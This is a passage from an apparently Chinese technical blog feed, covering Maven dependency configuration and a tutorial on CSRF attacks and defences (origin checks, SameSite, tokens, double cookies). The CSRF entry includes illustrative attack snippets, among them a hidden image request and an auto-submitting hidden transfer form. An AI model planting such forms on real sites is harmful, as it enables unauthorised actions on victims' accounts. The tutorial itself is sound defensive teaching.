<li>name：项目名称</li>
</ol>
<h2 id="依赖信息：dependency">依赖信息：dependency</h2>
<ol>
<li>
<p>dependencyManagement：（父模块中使用）继承此依赖项的项目的默认依赖项信息。此部分中的依赖项不会立即解析。相反，当从这个父POM派生的子POM声明了一个由匹配的groupId和artifactId描述的依赖项时，如果这个部分的版本和其他值尚未指定，则将用于该依赖项</p>
</li>
<li>
<p>dependencies：依赖包配置列表 包含多个dependency配置</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>                          
   ...                     
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>  
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>                          
   ...                     
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>dependency :  依赖包信息</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>                          
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>实际项目<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>           
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>模块<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>       
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>版本<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>             
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">&gt;</span></span>依赖类型<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">&gt;</span></span>                 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>依赖范围：默认是compile。可选项：compile、provided、runtime、test、system<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>optional</span><span class="token punctuation">&gt;</span></span>依赖是否传递,默认值为false。此jar包不会在其他项目中被引用加载、不参与maven的依赖传递<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>optional</span><span class="token punctuation">&gt;</span></span>       
    <span class="token comment">&lt;!-- 排除传递性依赖 --&gt;</span>              
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">&gt;</span></span>                      
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">&gt;</span></span>                   
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>…<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>      
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>…<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">&gt;</span></span>                  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">&gt;</span></span>                     
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h2 id="依赖范围：-dependency-scope-详细说明">依赖范围： dependency.scope 详细说明</h2>
<blockquote>
<p>scope 依赖传递:</p>
<p>A -&gt; B -&gt; C, 当前项目 A，A依赖于B，B依赖于C，知道B在 A中的scope，怎么知道 C在 A 中的 scope</p>
<p>即，A需不需要 C的问题，本质由 C在B中的scope决定</p>
<p>当 C 在 B 中的scope 是test 或 provided 时，C 直接被丢弃，A不依赖C</p>
<p>否则 A 依赖 C，C的scope 继承与B 的scope</p>
</blockquote>
<table>
<thead>
<tr>
<th>scope</th>
<th>范围</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>compile</code></td>
<td>compile<br>runtime<br>test<br>package</td>
<td>默认配置。运行期有效，需要打入包中。该依赖需要参与当前项目的编译、测试、运行、打包</td>
</tr>
<tr>
<td>provided</td>
<td>compile<br>test</td>
<td>只存在编译、测试、阶段，不会打入包中<br>表明该依赖已经提供，故只在未提供时才被使用</td>
</tr>
<tr>
<td>runtime</td>
<td>runtime<br>test<br>package</td>
<td>编译不需要，在运行期有效，需要导入包中。（接口与实现分离）<br>比如，你可能在编译的时候只需要JDBC API JAR，而只有在运行的时候才需要JDBC驱动实现。</td>
</tr>
<tr>
<td>test</td>
<td>test</td>
<td>测试需要，不会打入包中</td>
</tr>
<tr>
<td>system</td>
<td>compile<br>test</td>
<td>和<code>provided</code>类似，在编译、测试时有效，但是在运行时无效。<br>和<code>provided</code>的区别：使用system范围的依赖时必须通过systemPath元素显式地指定依赖文件的路径。<br>由于此类依赖不是通过Maven仓库解析的，而且往往与本机系统绑定，可能造成构建的不可移植，因此应该谨慎使用。</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p>provided</p>
<p>应用场景：你定义了一个servlet，此刻得需要  <code>servlet-api.jar</code> 才能编译成功，但是当你达成 <code>war</code> 包时，你并不想将 <code>servlet-api.jar</code> 包进去，因为<code>Tomcat</code>等容器会提供，所以当启动Tomcat的时候，就不会冲突了</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>javax.servlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>servlet-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.0-alpha-1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>   
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>provided<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>system</p>
<p>从参与度来说，和provided相同，不过被依赖项不会从maven仓库下载，而是从本地文件系统拿。需要添加systemPath的属性来定义路径。</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
  <span class="token comment">&lt;!--自定义--&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.im<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span> 
  <span class="token comment">&lt;!--自定义--&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>sdk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  
  <span class="token comment">&lt;!--自定义--&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
  <span class="token comment">&lt;!--system，类似provided，需要显式提供依赖的jar以后，Maven就不会在Repository中查找它--&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>system<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
  <span class="token comment">&lt;!--项目根目录下的lib文件夹下--&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>systemPath</span><span class="token punctuation">&gt;</span></span>${basedir}/lib/sdk-1.0.jar<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>systemPath</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h1>Maven预定义内置属性</h1>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">${basedir} 表示项目根目录,即包含pom.xml文件的目录;
${version} 表示项目版本;
${project.basedir} 同${basedir};
${project.baseUri} 表示项目文件地址;
${maven.build.timestamp} 表示项目构件开始时间;
${maven.build.timestamp.format} 表示属性${maven.build.timestamp}的展示格式,默认值为yyyyMMdd-HHmm,可自定义其格式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Maven项目中指定JDK</h1>
<h2 id="默认版本">默认版本</h2>
<p>Maven项目中，编译器和JRE的版本默认为1.5 (所以Alt + F5刷新项目后，多个参数值会变成1.5)，参数如下(选中项目，Alt + Enter，查看项目属性)</p>
<pre class="line-numbers language-none"><code class="language-none">Java Build Path下的Libraries下的JRE System Lirbrary的版本。
Java Compiler下的JDK Compiler的版本。
Maven下的Project Facts下的Java的版本。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="项目中配置JDK版本">项目中配置JDK版本</h2>
<p>配置properties节点下的maven编译器信息</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.version</span><span class="token punctuation">&gt;</span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>配置<code>build&gt;plugins&gt;plugins&gt;configuration</code>节点下的source和target节点值</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>maven-compiler-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.3.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span><span class="token punctuation">&gt;</span></span>${java.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>source</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">&gt;</span></span>${java.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>软件工具</category>
      </categories>
      <tags>
        <tag>Maven</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF漏洞处理</title>
    <url>/20221025/96960bec.html</url>
    <content><![CDATA[<h1><a href="https://segmentfault.com/a/1190000019980372">前端安全系列：CSRF篇</a></h1>
<h2 id="CSRF介绍">CSRF介绍</h2>
<p>CSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户的请求来利用受信任的网站。攻击通过在授权用户访问的页面中包含链接或者脚本的方式工作</p>
<h2 id="CSRF攻击">CSRF攻击</h2>
<p>一个典型的CSRF攻击流程大概如下:</p>
<ol>
<li>用户登录<code>a.com</code>并<strong>保留登录信息</strong></li>
<li>攻击者<strong>引诱用户访问</strong>了<code>b.com</code></li>
<li><code>b.com</code>在用户不知情的情况下向<code>a.com</code>发送请求并携带用户的登录信息</li>
<li><code>a.com</code>接收请求验证登录信息通过执行某些恶意操作</li>
<li>攻击者在用户不知情的情况下冒充用户的身份完成了攻击.</li>
</ol>
<p>攻击方式:</p>
<ul>
<li>攻击者的网站</li>
<li>有文件上传漏洞的网站</li>
<li>第三方论坛,博客等网站</li>
<li>目标网站自身的漏洞</li>
</ul>
<p>相对<code>XSS</code>攻击,<code>CSRF</code>攻击不太一样</p>
<ul>
<li>一般攻击发起点不在目标网站,而是被引导到第三方网站再发起攻击,这样目标网站就无法防止</li>
<li>攻击者不能获取到用户Cookies,包括子域名,而是利用Cookies的特性冒充用户身份进行攻击</li>
<li>通常是跨域攻击,因为攻击者更容易掌握第三方网站而不是只能利用目标网站自身漏洞</li>
<li>攻击方式包括图片,URL,CORS,表单,甚至直接嵌入第三方论坛,文章等等,难以追踪</li>
</ul>
<h2 id="常见的CSRF攻击类型">常见的CSRF攻击类型</h2>
<h3 id="GET请求">GET请求</h3>
<p>例如利用隐藏图片自动发起一个HTTP请求,会自动附带用户cookies</p>
<pre class="line-numbers language-abnf" data-language="abnf"><code class="language-abnf">&lt;img <span class="token rule">style</span><span class="token operator">=</span><span class="token string">"width:0;"</span> <span class="token definition keyword">src</span><span class="token operator">=</span><span class="token string">"https://www.test.com/xxx"</span> <span class="token operator">/</span>&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="POST请求">POST请求</h3>
<p>例如利用隐藏表单自动提交</p>
<pre class="line-numbers language-abnf" data-language="abnf"><code class="language-abnf">&lt;form <span class="token rule">action</span><span class="token operator">=</span><span class="token string">"https://www.test.com/xxx"</span> <span class="token definition keyword">method</span><span class="token operator">=</span><span class="token rule">POST</span>&gt;
    &lt;input <span class="token rule">type</span><span class="token operator">=</span><span class="token string">"hidden"</span> <span class="token definition keyword">name</span><span class="token operator">=</span><span class="token string">"account"</span> <span class="token definition keyword">value</span><span class="token operator">=</span><span class="token string">"xiaoming"</span> <span class="token operator">/</span>&gt;
    &lt;input <span class="token rule">type</span><span class="token operator">=</span><span class="token string">"hidden"</span> <span class="token definition keyword">name</span><span class="token operator">=</span><span class="token string">"amount"</span> <span class="token definition keyword">value</span><span class="token operator">=</span><span class="token string">"10000"</span> <span class="token operator">/</span>&gt;
<span class="token rule"><span class="token punctuation">&lt;</span>/form<span class="token punctuation">&gt;</span></span>
<span class="token rule"><span class="token punctuation">&lt;</span>script<span class="token punctuation">&gt;</span></span> <span class="token rule">document</span>.<span class="token rule">forms</span><span class="token punctuation">[</span><span class="token repetition operator">0</span><span class="token punctuation">]</span>.<span class="token rule">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">; &lt;/script&gt; </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="URL攻击">URL攻击</h3>
<p>比较常见的利诱广告方式或者冒充QQ病毒警告等引诱用户自己点击</p>
<pre class="line-numbers language-routeros" data-language="routeros"><code class="language-routeros">&lt;a href="https://www.test.com/xxx" taget="_blank"&gt;
  一刀9999级,神级装备,顶级神宠,开服就有！！
&lt;a/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="防御：限制访问名单">防御：限制访问名单</h2>
<h3 id="同源检测">同源检测</h3>
<p>HTTP协议中一般会携带两个带有来源信息的字段:</p>
<h4 id="Origin">Origin</h4>
<p>指示了请求来自于哪个站点。该字段仅指示服务器名称，并不包含任何路径信息, 用于 CORS 请求或者 POST 请求。Origin在以下两种情况下并不存在：</p>
<ul>
<li>IE 11 不会在跨站CORS请求上添加Origin标头</li>
<li>302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。</li>
</ul>
<h4 id="Referer">Referer</h4>
<p>包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 Referer 首部识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等。</p>
<ul>
<li>对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。</li>
<li>对于页面跳转，Referer为打开页面历史记录的前一个页面地址</li>
</ul>
<p>在以下情况下，<code>Referer</code> 不会被发送：</p>
<ul>
<li>来源页面采用的协议为表示本地文件的 “file” 或者 “data” URI</li>
<li>当前请求页面采用的是非安全协议，而来源页面采用的是安全协议（HTTPS）</li>
</ul>
<p>虽然HTTP有明确要求,也有Referrer Policy草案对浏览器如何发送做了详细规定,但是浏览器实现可能有差别,不能保障安全性.低版本浏览器,Flash等情况可能丢失或不可信,新的Referrer规定了五种策略：</p>
<table>
<thead>
<tr>
<th>States</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>no-Referrer</td>
<td>任何情况下都不发送Referrer信息</td>
</tr>
<tr>
<td>no-Referrer-when-downgrade</td>
<td>仅当协议降级（如HTTPS页面引入HTTP资源）时不发送Referrer信息。是大部分浏览器默认策略</td>
</tr>
<tr>
<td>origin</td>
<td>发送只包含host部分的referrer.</td>
</tr>
<tr>
<td>origin-when-cross-origin</td>
<td>仅在发生跨域访问时发送只包含host的Referer，同域下还是完整的。与Origin Only的区别是多判断了是否Cross-origin。协议、域名和端口都一致，浏览器才认为是同域</td>
</tr>
<tr>
<td>unsafe-url</td>
<td>全部都发送Referrer信息。最宽松最不安全的策略</td>
</tr>
</tbody>
</table>
<p>设置Referrer Policy的方法有:</p>
<ul>
<li>
<p>在HTTP的CSP（Content Security Policy）设置</p>
<pre class="line-numbers language-pgsql" data-language="pgsql"><code class="language-pgsql">Content-Security-Policy: referrer no-referrer|no-referrer-when-downgrade|origin|origin-when-cross-origin|unsafe-url;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>页面头部增加meta标签, 默认no-referer策略</p>
<pre class="line-numbers language-routeros" data-language="routeros"><code class="language-routeros">&lt;meta name="referrer" content="no-referrer|no-referrer-when-downgrade|origin|origin-when-crossorigin|unsafe-url"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>a标签增加Referrer Policy属性,只支持三种</p>
<pre class="line-numbers language-routeros" data-language="routeros"><code class="language-routeros">&lt;a href="http://example.com" referrer="no-referrer|origin|unsafe-url"&gt;xxx&lt;/a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ul>
<p>发起请求的来源域名可能是网站本域，或者子域名，或者有授权的第三方域名，又或者来自不可信的未知域名。业务上需要针对各种情况作出过滤规则,一般优先使用<code>Origin</code>确认来源信息就够了,<code>Referrer </code>变数太多比较适合打辅助.但是如果两者都获取不到的情况下,建议直接进行阻止.</p>
<p>同源规则能简单防范大多数CSRF攻击,配合关键接口做额外处理能更好提高安全性.</p>
<h3 id="SameSite">SameSite</h3>
<p>一种新的防止跨站点请求伪造（cross site request forgery）的 http 安全特性。该值可以设置为 <code>Strict</code> 或 <code>Lax</code>,现阶段只有部分主流浏览器支持,仅做了解即可</p>
<pre class="line-numbers language-routeros" data-language="routeros"><code class="language-routeros">Set-Cookie: key=value; SameSite=Strict/Lax<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>Strict: 跨域请求或者新标签重新打开都不会携带该Cokies</li>
<li>Lax: 这个请求是（改变了当前页面或者打开了新页面）且同时是个GET请求，则携带。</li>
</ul>
<p>还有一个比较严重的问题是SameSite不支持子域名.</p>
<h2 id="防御：附加验证">防御：附加验证</h2>
<h3 id="验证码">验证码</h3>
<p>通过图形验证码或者手机验证码或者邮箱验证等多种方式强制用户进行交互可以有效遏制CSRF攻击,缺点是步骤比较繁琐,只适用于如涉及金额,密码相关等关键请求,</p>
<h3 id="CSRF-Token">CSRF Token</h3>
<p>基于攻击者无法获得用户信息的特性,我们可以在前后端交互中携带一个有效验证“令牌”来防范CSRF攻击,大概流程:</p>
<ol>
<li>当用户首次登录成功之后, 服务端会生成一个唯一性和随机性的 token 值保存在服务器的Session或者其他缓存系统中，再将这个token值返回给浏览器；</li>
<li>浏览器拿到 token 值之后本地保存；</li>
<li>当浏览器再次发送网络请求的时候,就会将这个 token 值附带到参数中(或者通过Header头)发送给服务端；</li>
<li>服务端接收到浏览器的请求之后,会取出token值与保存在服务器的Session的token值做对比验证其正确性和有效期。</li>
</ol>
<p>在大型网站一般使用多台服务器,用户请求经过负载均衡器路由到具体的服务器上,如果使用Session默认储存在单机服务器内存中,在分布式环境下同一用户的多次请求可能会指向不同的服务器上,而其他的服务器无法共享Session导致Session机制失效无法验证,所以分布式集群中Token需要储存在Redis等公共储存空间.</p>
<p>因为读取和验证Token会有复杂度和性能的问题,还有种方式采用Encrypted Token Pattern方式,通常是使用UserID、时间戳和随机数，通过加密的方法生成而非随机性,之后请求校验不需要读取而是直接计算即可,这样既可以保证分布式服务的Token一致，又能保证Token不容易被破解。</p>
<h3 id="双重Cookie验证">双重Cookie验证</h3>
<p>相较于CSRF Token,这种方式比较简单实现但是安全性较低.大概流程:</p>
<ol>
<li>用户访问页面之后域名被注入随机字符串Cookie</li>
<li>浏览器发起请求时会取出该Cookie字符串添加到URL参数中</li>
<li>服务端验证是否一致</li>
</ol>
<p>没有大规模应用除了安全性问题还有一个就是跨域可能导致获取不到Cookie.</p>
<ol>
<li>用户访问网站域名<code>www.test.com</code>,服务端api域名<code>api.test.com</code>,</li>
<li>如果想要共用Cookie就必须注入到<code>test.com</code>,然后子域名都能获取到</li>
<li>同理每个子域名都能修改该Cookie,如果某个子域名被攻击了</li>
<li>攻击者可以自己配置一个Cookie破解双重Cookie验证机制拦截</li>
</ol>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Maven基础</title>
    <url>/20221030/195cf5d1.html</url>
    <content><![CDATA[<h1>命令行创建项目</h1>
<blockquote>
<p>maven3.0.5以上版本舍弃了create，使用generate生成项目</p>
</blockquote>
<p>命令行执行 <code>mvn archetype:generate </code>命令，使用互动方依次输入参数，或者直接指定参数</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mvn archetype:generate <span class="token parameter variable">-DgroupId</span><span class="token operator">=</span>com.local <span class="token parameter variable">-DartifactId</span><span class="token operator">=</span>learn <span class="token punctuation">\</span>
      <span class="token parameter variable">-DpackageName</span><span class="token operator">=</span>com.local.com.local -DarchetypeArtifactId:maven-archetype-quickstart <span class="token punctuation">\</span>
      <span class="token parameter variable">-Dversion</span><span class="token operator">=</span><span class="token number">0.0</span>.1-SNAPSHOT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h1>建立Maven环境</h1>
<h2 id="1、项目中远程仓库的配置">1、项目中远程仓库的配置</h2>
<p>在平时的开发中，我们往往不会使用默认的中央仓库，默认的中央仓库访问的速度比较慢，访问的人或许很多，有时候也无法满足我们项目的需求，可能项目需要的某些构件中央仓库中是没有的，而在其他远程仓库中有。这时，可以在<code>pom.xml</code>中配置该仓库，代码如下：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 配置远程仓库 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>repositories</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>repository</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>jboss<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>JBoss Repository<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">&gt;</span></span>http://repository.jboss.com/maven2/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>releases</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>enabled</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>enabled</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updatePolicy</span><span class="token punctuation">&gt;</span></span>daily<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updatePolicy</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>releases</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>snapshots</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>enabled</span><span class="token punctuation">&gt;</span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>enabled</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>checksumPolicy</span><span class="token punctuation">&gt;</span></span>warn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>checksumPolicy</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>snapshots</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>layout</span><span class="token punctuation">&gt;</span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>layout</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>repository</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>repositories</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>配置</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
